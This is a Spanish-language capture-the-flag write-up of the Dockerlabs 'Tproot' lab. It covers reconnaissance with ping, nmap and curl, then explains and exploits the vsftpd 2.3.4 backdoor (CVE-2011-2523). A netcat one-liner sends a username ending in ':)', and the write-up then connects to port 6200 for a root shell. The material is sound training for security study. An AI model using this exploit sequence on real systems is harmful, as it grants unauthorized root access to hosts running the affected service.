# Writeup: Tproot &mdash; Dockerlabs
- **Dificultad:** Muy Fácil
- **Plataforma:** Dockerlabs
- **IP Objetivo:** 172.17.0.2
- **Técnicas Clave:** Auditoría de red, análisis de servicios, identificación de fallos de configuración  y versiones obsoletas (**CVE-2011-2523**)

___
### Verificación de Conectividad &mdash; Fase de Reconocimiento
Se envía una traza ICMP hacia la dirección IP asignada al contenedor para validar la accesibilidad a nivel de red y evaluar el valor TTL:

    $ ping -c 2 172.17.0.2

#### Salida Obtenida:

![ping](img/)

**Nota de Análisis:** La respuesta exitosa con un TTL de 64 bytes confirma conectividad directa y sugiere que el sistema operativo subyacente es Linux.

___
### Escaneo de Puertos y Detección de Servicios
Se realiza un escaneo exhaustivo sobre todo el rango de puertos TCP para identificar servicios abiertos, versiones exactas y ejecutar los scripts básicos de reconocimiento de nmap:

    $ nmap -p- -sS -sC -sV 172.17.0.2 -n -Pn

![Nmap Scan](img/)

#### Puertos y Servicios Identificados:
- **21/tcp** &mdash; ```(vsftpd 2.3.4)```
- **80/tcp** &mdash; ```(Apache httpd)```

___
### Enumeración Web (Puerto 80)
Se analiza el servicio HTTP detectado realizando una petición directa para inspeccionar el contenido del servidor:

    $ curl -s http://172.17.0.2

![Curl](img/)

#### Resultado de la Inspección
- La respuesta arrojó la página HTML por defecto de Apache2 en Ubuntu
- El análisis del código fuente y comentarios no reveló rutas ocultas, párametros, correos, ni credenciales expuestas
- Se descartó el vector web como punto de acceso inicial, redirigiendo el foco hacia el servicio FTP

___
### Enumeración del Servicio FTP (Puerto 21)
Se evaluó la posibilidad de acceso no autenticado mediante el usuario ```anonymous``` y una contraseña vacía:

![ftpConnection](img/)

#### Resultado Obtenido
El inicio de sesión anónimo se encuentra deshabilitado, descartando la transferencia de archivos sin autenticación por esta vía.

____
### Detección de Vulnerabilidades
Se ejecutó la categoría de scripts de vulnerabilidades de Nmap para contrastar los servicios expuestos contra firmas de fallos de seguridad conocidos:

    $ nmap --scripts vuln 172.17.0.2 -p 21

![Nmap Scan Vuln]

#### Resultado Obtenido
- **CVE-2011-2523**
- **Vulnerable** &mdash; ```(vsftp-2.3.4-backdoor)```

----
### Análisis Técnico del Fallo (```CVE-2011-2523```)
- **Origen:** En julio de 2011, el código fuente oficial de la version 2.3.4 de vsfptd alojado en los servidores de descarga principales fue modificado por un tercero no autorizado para incluir una puerta trasera.
- **Mecanismo:** La función de autenticación contenía una condición en la quem si el nombre de usuario terminaba con la secuencia de caracteres ```:)```, el servicio ejecutaba una llamada al sistema abriendo un listener en el puerto TCP ```6200``` con privilegios de ejecución equivalentes al proceso del servidor FTP ```root```.
- **Impacto:** Permite la obtención de una shell interactiva remota en el puerto ```6200``` sin necesidad de credenciales válidas.

___
### Verificación del Acceso y Confirmación de Privilegios
Se transmitió la secuencia de autenticación que activa la condición en el servicio FTP:

    $ echo -e "USER prueba:)\nPASS 1234" | nc 172.17.0.2 21

Posteriormente, se estableció la conexión hacia el puerto alternativo habilitado por el servicio y se comprobó la identidad dentro del sistema objetivo:

    whoami
    # root
    id
    # uid=0(root) gid=(root) groups=(root)

![Flag](img/)

#### Resultado
Se confirmó la obtención de una shell interactiva con privilegios de superusuario, concluyendo el objetivo del laboratorio.
